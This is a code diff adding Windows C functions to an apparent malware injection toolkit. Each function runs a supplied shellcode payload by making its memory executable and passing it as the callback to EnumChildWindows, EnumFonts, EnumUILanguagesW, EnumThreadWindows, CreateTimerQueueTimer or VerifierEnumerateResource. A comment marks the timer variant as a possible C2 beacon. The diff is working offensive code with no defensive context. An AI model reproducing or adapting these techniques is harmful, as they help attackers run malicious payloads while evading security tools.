@@ -27,6 +27,176 @@ BOOLEAN APCPayloadInjection
 }
 
 
+BOOLEAN InjectCallbackPayloadEnumChildWindows
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID * pInjectedPayloadAddress
+)
+{
+		if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+
+		PUCHAR pLocalPayload = NULL;
+
+		if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+		if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+		if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+		if (!EnumChildWindows(NULL, (WNDENUMPROC)pLocalPayload, NULL)) return  FALSE;
+
+		*pInjectedPayloadAddress = pLocalPayload;
+
+		return TRUE;
+}
+
+BOOLEAN InjectCallbackPayloadEnumFonts
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID * pInjectedPayloadAddress
+)
+{
+	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+
+	PUCHAR pLocalPayload = NULL;
+
+	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+	EnumFontsW( GetDC(NULL), NULL, (FONTENUMPROCW)pLocalPayload, NULL);
+
+	*pInjectedPayloadAddress = pLocalPayload;
+
+	return TRUE;
+}
+
+BOOLEAN InjectCallbackPayloadEnumUILanguagesW
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID * pInjectedPayloadAddress
+)
+{
+	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+
+	PUCHAR pLocalPayload = NULL;
+
+	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+	if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)pLocalPayload, MUI_LANGUAGE_NAME, NULL)) return  FALSE;
+
+	*pInjectedPayloadAddress = pLocalPayload;
+
+	return TRUE;
+}
+
+BOOLEAN InjectCallbackPayloadEnumThreadWindows
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID  *pInjectedPayloadAddress
+)
+{
+	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+
+	PUCHAR pLocalPayload = NULL;
+
+	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+	if (!EnumThreadWindows(NULL, (WNDENUMPROC)pLocalPayload, NULL)) return  FALSE;
+
+	*pInjectedPayloadAddress = pLocalPayload;
+
+	return TRUE;
+}
+
+BOOLEAN InjectCallbackPayloadTimer //Possible beacon function 4 C2
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PHANDLE phTimerHandle,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID  *pInjectedPayloadAddress
+)
+{
+	if (!sPayloadSize || !phTimerHandle || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+
+	PUCHAR pLocalPayload = NULL;
+
+	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+	if (!CreateTimerQueueTimer(
+		phTimerHandle,
+		0,
+		(WAITORTIMERCALLBACK)pLocalPayload,
+		NULL,
+		NULL,
+		NULL,
+		NULL
+	)) return  FALSE;
+	
+	return TRUE;
+}
+
+BOOLEAN InjectCallbackPayloadVerEnumResource
+(
+	IN     LPVOID  pPayload,
+	IN     DWORD   sPayloadSize,
+	   OUT PDWORD  pdwOldProtections,
+	   OUT PVOID  *pInjectedPayloadAddress
+)
+{
+	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
+	HMODULE hModule = { NULL };
+	if (!(hModule = LoadLibraryA("verifier.dll")))return FALSE;
+
+	
+	PUCHAR pLocalPayload = NULL;
+
+	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+
+	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
+
+	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
+
+	fnVerifierEnumerateResource pVerifierEnumerateResource;
+
+	if (!(pVerifierEnumerateResource = (fnVerifierEnumerateResource)GetProcAddress(hModule,(LPCSTR)"VerifierEnumerateResource")))return FALSE;
+
+	if (!pVerifierEnumerateResource(
+		GetCurrentProcess(),
+		NULL,
+		AvrfResourceHeapAllocation,
+		(AVRF_RESOURCE_ENUMERATE_CALLBACK)pLocalPayload,
+		NULL
+	))return FALSE;
+
+	if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)pLocalPayload, MUI_LANGUAGE_NAME, NULL)) return  FALSE;
+
+	return TRUE;
+}
+
 BOOLEAN InjectRemoteProcessShellcode
 (
 	IN     HANDLE hProcessHandle,
